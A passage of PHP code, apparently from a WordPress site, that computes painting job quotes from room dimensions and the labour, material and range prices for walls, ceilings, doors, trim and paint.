                                        if($d['slug'] == 'new_ceiling') {
                                                $new_ceiling_title = $d['title'];
                                                $new_ceiling_prices = $d['type_of_price'];
                                                $new_ceiling_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'doors') {
                                                $doors_title = $d['title'];
                                                $doors_prices = $d['type_of_price'];
                                                $doors_data = $d['fields'];
                                        }
																		    if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'trim') {
                                                $trim_title = $d['title'];
                                                $trim_prices = $d['type_of_price'];
                                                $trim_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'paint') {
                                                $paint_title = $d['title'];
                                                $paint_prices = $d['type_of_price'];
                                                $paint_data = $d['fields'];
                                        }   																}

                                
	                              $wall_area = $walllength * $wallheight;
                                $ceiling_area = $ceilingwidth * $ceilinglength;

                $current_walls = $data['current_walls'];
                $current_walls_total = 0;
                foreach($current_walls_data as $temp) {
                        if( in_array($temp['title'],$current_walls) ) {


                                if($current_walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_walls_total = $current_walls_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($current_walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_walls_total = $current_walls_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	              $wall_prep = $data['wall_prep'];
                $wall_prep_total = 0;
                foreach($wall_prep_data as $temp) {
                        if( in_array($temp['title'],$wall_prep) ) {

                                if($wall_prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        $wall_prep_total = $wall_prep_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($wall_prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $wall_prep_total = $wall_prep_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

                $new_walls = $data['new_walls'];
                $new_walls_total = 0;
                foreach($new_walls_data as $temp) {
                        if( in_array($temp['title'],$new_walls) ) {

                                       if($new_walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$new_walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $new_walls_total = $new_walls_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($new_walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $new_walls_total = $new_walls_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	              $current_ceiling = $data['current_ceiling'];
                $current_ceiling_total = 0;
                foreach($current_ceiling_data as $temp) {
                        if( in_array($temp['title'],$current_ceiling) ) {


                                if($current_ceiling_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_ceiling_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_ceiling_total = $current_ceiling_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($current_ceiling_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_ceiling_total = $current_ceiling_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }

                $ceiling_prep = $data['ceiling_prep'];
                $ceiling_prep_total = 0;
                foreach($ceiling_prep_data as $temp) {
                        if( in_array($temp['title'],$ceiling_prep) ) {


                                if($ceiling_prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$ceiling_prep_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $ceiling_prep_total = $ceiling_prep_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($ceiling_prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $ceiling_prep_total = $ceiling_prep_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }


                $new_ceiling = $data['new_ceiling'];
                $new_ceiling_total = 0;
                foreach($new_ceiling_data as $temp) {
                        if( in_array($temp['title'],$new_ceiling) ) {


                                if($new_ceiling_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$new_ceiling_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $new_ceiling_total = $new_ceiling_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($new_ceiling_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $new_ceiling_total = $new_ceiling_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }


                $doors = $data['doors'];
                $doors_total = 0;
                foreach($doors_data as $temp) {
                        if( in_array($temp['title'],$doors) ) {

                                // let's count QNT of each doors field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $doors_count = $data['' . $count_field_title . ''];
                                if($doors_count == NULL || $doors_count == '' || empty($doors_count)) {
                                       $doors_count = 1;
                                }

                                if($doors_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$doors_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $doors_total = $doors_total +  ( $labour_and_material_total * $doors_count);
                                }
                                elseif($doors_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $doors_total = $doors_total + ( $range_price_total * $doors_count);
                                }

                        }

                }

                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each doors field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }

                $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( in_array($temp['title'],$trim) ) {

                                // let's count QNT of each trim field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $trim_count = $data['' . $count_field_title . ''];
                                if($trim_count == NULL || $trim_count == '' || empty($trim_count)) {
                                       $trim_count = 1;
                                }

                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total +  ( $labour_and_material_total * $trim_count);
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ( $range_price_total * $trim_count);
                                }

                        }

                }


					      $paint = $data['paint'];
                $paint_total = 0;
                foreach($paint_data as $temp) {
                        if( $temp['title'] == $paint ) {

                                $range_price_total = $temp['range_price'];
                                $paint_total = $range_price_total;

                        }
                }

					      $level = $data['level'];
                $level_total = 0;
                foreach($level_data as $temp) {
                        if( $temp['title'] == $level ) {

                                $range_price_total = $temp['range_price'];
                                $level_total = $range_price_total;

                        }
                }
	                              $painting_total = $current_walls_total + $wall_prep_total + $new_walls_total + $doors_total + $extras_total + $current_ceiling_total + $ceiling_prep_total + $new_ceiling_total + $trim_total;
                                $level_markup = $painting_total * $level_total / 100;
					                      $paint_supply = $painting_total * $paint_total / 100;
					                      $paint_room_total = $painting_total + $paint_supply + $level_markup;

                                $total = $total + $paint_room_total;


                }
        
	
        // formulas for room painting
        if(get_the_title($t) == 'Single Room') {

                                  $all_scope_data = get_field('quote_fields',$t);

                                  $width = $data['area_width'];
                                  $length = $data['area_length'];
                                  $height = $data['height'];
                                  foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'current_walls') {
                                                $current_walls_title = $d['title'];
                                                $current_walls_prices = $d['type_of_price'];
                                                $current_walls_data = $d['fields'];
                                        }
																		    if($d['slug'] == 'level') {
                                                $level_title = $d['title'];
                                                $level_prices = $d['type_of_price'];
                                                $level_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'wall_prep') {
                                                $wall_prep_title = $d['title'];
                                                $wall_prep_prices = $d['type_of_price'];
                                                $wall_prep_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'new_walls') {
                                                $new_walls_title = $d['title'];
                                                $new_walls_prices = $d['type_of_price'];
                                                $new_walls_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'current_ceiling') {
                                                $current_ceiling_title = $d['title'];
                                                $current_ceiling_prices = $d['type_of_price'];
                                                $current_ceiling_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'ceiling_prep') {
                                                $ceiling_prep_title = $d['title'];
                                                $ceiling_prep_prices = $d['type_of_price'];
                                                $ceiling_prep_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'new_ceiling') {
                                                $new_ceiling_title = $d['title'];
                                                $new_ceiling_prices = $d['type_of_price'];
                                                $new_ceiling_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'doors') {
                                                $doors_title = $d['title'];
                                                $doors_prices = $d['type_of_price'];
                                                $doors_data = $d['fields'];
                                        }
																		    if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'trim') {
                                                $trim_title = $d['title'];
                                                $trim_prices = $d['type_of_price'];
                                                $trim_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'paint') {
                                                $paint_title = $d['title'];
                                                $paint_prices = $d['type_of_price'];
                                                $paint_data = $d['fields'];
                                        }   																}

	                              $wall_area = ( $width + $width + $length + $length ) * $height;
                                $ceiling_area = $width * $length;
                                $outer_length = $width + $width + $length + $length;

                $current_walls = $data['current_walls'];
                $current_walls_total = 0;
                foreach($current_walls_data as $temp) {
                        if( in_array($temp['title'],$current_walls) ) {


                                if($current_walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_walls_total = $current_walls_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($current_walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_walls_total = $current_walls_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	              $wall_prep = $data['wall_prep'];
                $wall_prep_total = 0;
                foreach($wall_prep_data as $temp) {
                        if( in_array($temp['title'],$wall_prep) ) {

                                if($wall_prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        $wall_prep_total = $wall_prep_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($wall_prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $wall_prep_total = $wall_prep_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

                $new_walls = $data['new_walls'];
                $new_walls_total = 0;
                foreach($new_walls_data as $temp) {
                        if( in_array($temp['title'],$new_walls) ) {

                                       if($new_walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$new_walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $new_walls_total = $new_walls_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($new_walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $new_walls_total = $new_walls_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	              $current_ceiling = $data['current_ceiling'];
                $current_ceiling_total = 0;
                foreach($current_ceiling_data as $temp) {
                        if( in_array($temp['title'],$current_ceiling) ) {


                                if($current_ceiling_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_ceiling_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_ceiling_total = $current_ceiling_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($current_ceiling_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_ceiling_total = $current_ceiling_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }

                $ceiling_prep = $data['ceiling_prep'];
                $ceiling_prep_total = 0;
                foreach($ceiling_prep_data as $temp) {
                        if( in_array($temp['title'],$ceiling_prep) ) {


                                if($ceiling_prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$ceiling_prep_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $ceiling_prep_total = $ceiling_prep_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($ceiling_prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $ceiling_prep_total = $ceiling_prep_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }


                 $new_ceiling = $data['new_ceiling'];
                $new_ceiling_total = 0;
                foreach($new_ceiling_data as $temp) {
                        if( in_array($temp['title'],$new_ceiling) ) {


                                if($new_ceiling_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$new_ceiling_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $new_ceiling_total = $new_ceiling_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($new_ceiling_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $new_ceiling_total = $new_ceiling_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }


                $doors = $data['doors'];
                $doors_total = 0;
                foreach($doors_data as $temp) {
                        if( in_array($temp['title'],$doors) ) {

                                // let's count QNT of each doors field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $doors_count = $data['' . $count_field_title . ''];
                                if($doors_count == NULL || $doors_count == '' || empty($doors_count)) {
                                       $doors_count = 1;
                                }

                                if($doors_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$doors_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $doors_total = $doors_total +  ( $labour_and_material_total * $doors_count);
                                }
                                elseif($doors_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $doors_total = $doors_total + ( $range_price_total * $doors_count);
                                }

                        }

                }

                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each doors field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }

                $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( in_array($temp['title'],$trim) ) {

                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total +  ( $labour_and_material_total * $outer_length);
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ( $range_price_total * $outer_length);
                                }

                        }

                }


					      $paint = $data['paint'];
                $paint_total = 0;
                foreach($paint_data as $temp) {
                        if( $temp['title'] == $paint ) {

                                $range_price_total = $temp['range_price'];
                                $paint_total = $range_price_total;

                        }
                }

					      $level = $data['level'];
                $level_total = 0;
                foreach($level_data as $temp) {
                        if( $temp['title'] == $level ) {

                                $range_price_total = $temp['range_price'];
                                $level_total = $range_price_total;

                        }
                }
	                              $painting_total = $current_walls_total + $wall_prep_total + $new_walls_total + $doors_total + $extras_total + $current_ceiling_total + $ceiling_prep_total + $new_ceiling_total + $trim_total;
                                $level_markup = $painting_total * $level_total / 100;
					                      $paint_supply = $painting_total * $paint_total / 100;
					                      $paint_room_total = $painting_total + $paint_supply + $level_markup;

                                $total = $total + $paint_room_total;


                }
	
	   // formulas for room painting
        if(get_the_title($t) == 'Room Painting') {

                                  $all_scope_data = get_field('quote_fields',$t);

                                  $width = $data['area_width'];
                                  $length = $data['area_length'];
                                  $height = $data['height'];
                                  foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'current_walls') {
                                                $current_walls_title = $d['title'];
                                                $current_walls_prices = $d['type_of_price'];
                                                $current_walls_data = $d['fields'];
                                        }
																		    if($d['slug'] == 'level') {
                                                $level_title = $d['title'];
                                                $level_prices = $d['type_of_price'];
                                                $level_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'wall_prep') {
                                                $wall_prep_title = $d['title'];
                                                $wall_prep_prices = $d['type_of_price'];
                                                $wall_prep_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'new_walls') {
                                                $new_walls_title = $d['title'];
                                                $new_walls_prices = $d['type_of_price'];
                                                $new_walls_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'current_ceiling') {
                                                $current_ceiling_title = $d['title'];
                                                $current_ceiling_prices = $d['type_of_price'];
                                                $current_ceiling_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'ceiling_prep') {
                                                $ceiling_prep_title = $d['title'];
                                                $ceiling_prep_prices = $d['type_of_price'];
                                                $ceiling_prep_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'new_ceiling') {
                                                $new_ceiling_title = $d['title'];
                                                $new_ceiling_prices = $d['type_of_price'];
                                                $new_ceiling_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'doors') {
                                                $doors_title = $d['title'];
                                                $doors_prices = $d['type_of_price'];
                                                $doors_data = $d['fields'];
                                        }
																		    if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'trim') {
                                                $trim_title = $d['title'];
                                                $trim_prices = $d['type_of_price'];
                                                $trim_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'paint') {
                                                $paint_title = $d['title'];
                                                $paint_prices = $d['type_of_price'];
                                                $paint_data = $d['fields'];
                                        }   																}

	                              $wall_area = ( $width + $width + $length + $length ) * $height;
                                $ceiling_area = $width * $length;
                                $outer_length = $width + $width + $length + $length;

                $current_walls = $data['current_walls'];
                $current_walls_total = 0;
                foreach($current_walls_data as $temp) {
                        if( in_array($temp['title'],$current_walls) ) {


                                if($current_walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_walls_total = $current_walls_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($current_walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_walls_total = $current_walls_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	              $wall_prep = $data['wall_prep'];
                $wall_prep_total = 0;
                foreach($wall_prep_data as $temp) {
                        if( in_array($temp['title'],$wall_prep) ) {

                                if($wall_prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
